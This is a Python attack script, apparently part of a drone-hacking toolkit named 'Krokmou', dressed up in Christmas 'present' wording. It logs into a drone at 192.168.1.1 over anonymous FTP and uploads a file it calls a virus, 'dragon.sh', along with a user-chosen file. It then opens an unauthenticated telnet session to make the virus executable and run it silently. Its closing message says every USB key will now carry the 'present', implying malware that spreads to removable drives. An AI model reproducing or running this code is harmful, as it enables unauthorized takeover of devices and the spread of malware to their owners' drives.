import os, time, sys, telnetlib, ntpath
from ftplib import FTP

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'


def animate(length):
    for value in range(1,length):
        sys.stdout.write(GREEN + '.')
        sys.stdout.flush()
        time.sleep(0.05)

#Leaving a christmas present on the drone
def christmas_present_main():
    header = '{}Krokmou > '.format(GREEN,WHITE)
    virus = "dragon.sh"

    print("\n{}Preparing {}Santa's Sleigh{}".format(GREEN,RED,GREEN),end='')
    animate(10)
    print('\n\n{}Feeding the {}reindeers{}'.format(GREEN,RED,GREEN),end='')
    animate(10)
    print('\n\n{}What do you want to put in your {}present{} ?'.format(GREEN,RED,GREEN))
    print('{}Enter the path to the file you want to upload to Krokmou\nLeave it blank and press ENTER if you want to send a {}beautiful picture{} of {}Krokmou{}.\n'.format(YELLOW,GREEN,YELLOW,RED,GREEN))

    path = input(header)
    if(path==''):
        path = os.path.dirname(__file__) + "/krokmou.png"

    print('\n{}Trying to locate and talk to {}Krokmou{}'.format(GREEN,RED,GREEN),end='')
    animate(10)
    try:
        ftp = FTP('192.168.1.1','anonymous','anonymous@', timeout=3)
    except:
        print("\n\n{}ERROR{}: Can't find Krokmou or Krokmou does't want to talk.\n".format(RED,GREEN))
        os._exit(1)

    print("\n{}Krokmou{} located and ready to discuss !\n".format(RED,GREEN))

    print('\n{}Sending {}virus{} to {}Krokmou'.format(GREEN,RED,GREEN,YELLOW),end='')
    animate(10)

    try:
        if("dragon.sh" in ftp.nlst()):
            is_on_Krokmou = True
        else:
            is_on_Krokmou = False

    except:
        print("\n\n{}ERROR{}: Can't talk to Krokmou.\n".format(RED,GREEN))
        os._exit(1)

    if(is_on_Krokmou == False):
        try:
            virus_file = open(virus,'rb')
            ftp.storbinary('STOR '+ virus, virus_file)
            virus_file.close()
            print("\n{}Virus successfully sent to {}Krokmou{} !\n".format(GREEN,RED,GREEN))
        except:
            print("\n\n{}ERROR{}: Can't send virus to Krokmou\n".format(RED,GREEN))
            os._exit(1)
    else:
        print("\n{}Virus already on Krokmou !\n".format(GREEN))

    print('\n{}Sending {}christmas present{} to {}Krokmou'.format(GREEN,RED,GREEN,YELLOW),end='')
    animate(10)
    try:

        present_file = open(path,'rb')
        ftp.storbinary('STOR '+ 'krok_' + ntpath.basename(path), present_file)
        present_file.close()
    except:
        print("\n\n{}ERROR{}: Can't send {}christmas present{} to Krokmou\n".format(RED,GREEN,RED,GREEN))
        os._exit(1)

    try:
        ftp.quit()
    except:
        print("\n\n{}ERROR{}: Can't quit (FTP) Krokmou !\n".format(RED,GREEN))
        os._exit(1)

    print("\n{}Christmas present successfully sent to {}Krokmou{} !\n".format(GREEN,RED,GREEN))

    print("\n{}Santa{} successfully delivered the {}package{} !\n".format(RED,GREEN,YELLOW,GREEN))

    if(is_on_Krokmou == False):
        print("\n{}Trying to run the virus".format(GREEN), end='')
        animate(10)
        try:
            telnet = telnetlib.Telnet("192.168.1.1")
            telnet.write(b"cd /data/video\n")
            telnet.write(b"ls\n")
            telnet.write(b"chmod +x dragon.sh\n")
            telnet.write(b"./dragon.sh\n")
            telnet.write(b"cd /bin\n")
            telnet.write(b"./dragon.sh >>/dev/null 2>>/dev/null\n")
            telnet.close()
        except:
            print("\n\n{}ERROR{}: Can't talk to Krokmou !\n".format(RED,GREEN))
            os._exit(1)

        print("\n{}Virus {}successfully{} running on {}Krokmou{} !\n".format(GREEN,YELLOW,GREEN,RED,GREEN))

    print("\n{}Every USB key{} will now go home with your {}little present{} :D{} !\n".format(RED,GREEN,YELLOW,RED,GREEN))
    print("\n{}Press ENTER to return to main menu...".format(GREEN))
    enter = input()
    os.system("clear")
